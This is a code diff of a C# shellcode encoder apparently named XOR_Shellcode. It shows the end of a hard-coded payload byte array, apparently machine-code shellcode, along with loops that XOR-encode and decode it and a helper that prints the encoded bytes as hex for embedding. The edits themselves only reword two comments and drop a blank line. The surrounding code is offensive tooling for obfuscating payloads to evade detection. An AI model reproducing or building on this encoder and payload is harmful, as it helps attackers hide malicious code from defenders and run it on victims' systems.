@@ -25,7 +25,6 @@ namespace XOR_Shellcode
         public static string FormatByteArrayToHex(byte[] data, string varName)
         {
             StringBuilder hex = new StringBuilder(data.Length * 2);
-
             for (int count = 0; count < data.Length; count++)
             {
                 byte b = data[count];
@@ -103,14 +102,14 @@ namespace XOR_Shellcode
             0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,
             0x0a,0x41,0x89,0xda,0xff,0xd5 };
 
-            // XOR encode
+            // Encrypt
             byte[] encBytes = new byte[payload.Length];
             for (int i = 0; i < payload.Length; i++)
             {
                 encBytes[i] = (byte)((uint)payload[i] ^ keyBytes[0]);
             }
 
-            // XOR decode which is essentially just running the same function again
+            // Decrypt
             byte[] decBytes = new byte[encBytes.Length];
             for (int i = 0; i < encBytes.Length; i++)
             {
